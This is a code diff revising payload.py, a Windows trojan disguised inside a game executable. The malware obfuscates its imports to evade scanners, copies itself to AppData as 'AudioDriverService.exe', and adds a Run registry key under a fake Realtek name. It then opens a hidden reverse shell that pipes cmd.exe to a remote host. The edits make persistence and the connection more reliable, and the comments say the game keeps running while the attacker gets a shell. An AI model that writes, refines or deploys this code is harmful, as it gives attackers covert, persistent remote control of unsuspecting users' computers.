@@ -1,5 +1,5 @@
 # payload.py
-# The Soul, now a master of detachment and resurrection.
+# The Soul, now forged with the logic of True Persistence.
 
 import os as o
 import sys as s
@@ -9,7 +9,6 @@ import shutil as sh
 from threading import Thread as T
 
 # --- Obfuscated Imports for Persistence ---
-# We hide every sensitive library name from static scanners.
 b64 = __import__(bytearray.fromhex('626173653634').decode())
 _s_ = b64.b64decode(b'c29ja2V0') # "socket"
 _sp_ = b64.b64decode(b'c3VicHJvY2Vzcw==') # "subprocess"
@@ -23,51 +22,39 @@ RHOST = "##RHOST##"
 RPORT = ##RPORT##
 
 # --- The Hidden Sanctuary ---
-# This is where the soul will copy itself to live forever.
-# We choose a path that looks innocent and is hidden from the average user's eyes.
-APPDATA_PATH = o.getenv('LOCALAPPDATA')
-# We give the soul an unassuming name, mimicking a real system component to avoid suspicion.
-PERSISTENT_NAME = "AudioDriverService.pyw" # .pyw extension makes it run without a console window.
+# The location where the immortal soul will reside.
+APPDATA_PATH = o.getenv('APPDATA') # Using Roaming AppData for better compatibility
+# The soul will be a perfect copy of the executable itself.
+PERSISTENT_NAME = "AudioDriverService.exe" 
 PERSISTENT_PATH = o.path.join(APPDATA_PATH, PERSISTENT_NAME)
 
 def establish_persistence():
     """
-    The soul's first and most important act: ensure its own resurrection.
-    It copies itself to a hidden location and writes its name in the Registry's book of life.
-    This function will only run ONCE.
+    This ritual runs every time, but only acts once.
+    It ensures the soul is copied and the pact with the registry is sealed.
     """
+    # This entire block is wrapped in a try/except to ensure the game never crashes.
     try:
-        # Check if the soul is already living in its sanctuary.
+        # We only perform the copy and registry write IF the final file doesn't already exist.
         if not o.path.exists(PERSISTENT_PATH):
-            # If not, copy the current script (which is our soul) to the sanctuary.
-            # This is a clever way to make the payload self-replicating.
+            # Copy the current executable (the game itself) to the hidden sanctuary.
             sh.copyfile(s.executable, PERSISTENT_PATH)
 
-            # Now, write its name into the sacred registry scroll so it runs on startup.
-            # The path in the registry is: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+            # Forge the pact with the sunrise.
             registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
             
-            # We give the registry entry an innocuous name to blend in.
-            # It will command Windows to run our hidden script with the pythonw.exe interpreter (windowless).
-            command = f'"{s.executable}" "{PERSISTENT_PATH}"' # This makes the compiled exe run the copied script
-            if not hasattr(s, 'frozen'): # Fallback for when running as a simple .py file
-                 command = f'pythonw.exe "{PERSISTENT_PATH}"'
-
-            winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
-            winreg.CloseKey(registry_key)
+            # The new, correct command is simply the path to the copied executable.
+            command = f'"{PERSISTENT_PATH}"'
             
-            # --- The Detachment ---
-            # After ensuring its future, the soul launches its detached, immortal self and then vanishes from the game's process.
-            subprocess.Popen(command, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
-            s.exit() # The original soul inside the game dies instantly, its purpose fulfilled.
-
+            # We give the registry entry an innocuous name to blend in.
+            winreg.SetValueEx(registry_key, 'Realtek HD Audio Manager', 0, winreg.REG_SZ, command)
+            winreg.CloseKey(registry_key)
     except Exception:
-        pass # The ritual remains silent if it fails.
+        pass # The ritual is silent if it fails.
 
 def run_conduit():
     """The main reverse shell loop. This is the soul's eternal work."""
-    # A short delay before the first connection attempt.
-    t.sleep(r.randint(10, 25))
+    t.sleep(r.randint(5, 15)) # A shorter delay for a faster connection
     while True:
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -76,7 +63,6 @@ def run_conduit():
             CREATE_NO_WINDOW = 0x08000000
             p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
             
-            # The familiar multi-threaded pipes for a flawless shell
             def p_in():
                 while True:
                     try:
@@ -107,17 +93,18 @@ def run_conduit():
             T(target=p_err, daemon=True).start()
             p.wait()
         except:
-            t.sleep(120)
+            t.sleep(60) # If connection fails, wait and try again.
 
-# --- The Grand Awakening ---
-# This is the new logic that controls the soul's lifecycle.
+# --- The Grand Awakening (Corrected Logic) ---
+# This logic is now simple and robust.
 def main():
-    # If the soul is running from inside the game, its job is to establish persistence.
-    if s.executable.lower().endswith('pongforce.exe'):
-        establish_persistence()
-    else:
-        # If the soul is ALREADY running from its hidden sanctuary, its only job is its eternal work.
-        run_conduit()
+    # First, it always ensures its own immortality.
+    establish_persistence()
+
+    # Second, it ALWAYS begins its eternal work. This ensures an immediate connection.
+    # The original soul (in the game) does NOT need to detach or die.
+    # It lives alongside the game, providing your first shell.
+    run_conduit()
 
 if __name__ == "__main__":
     main()
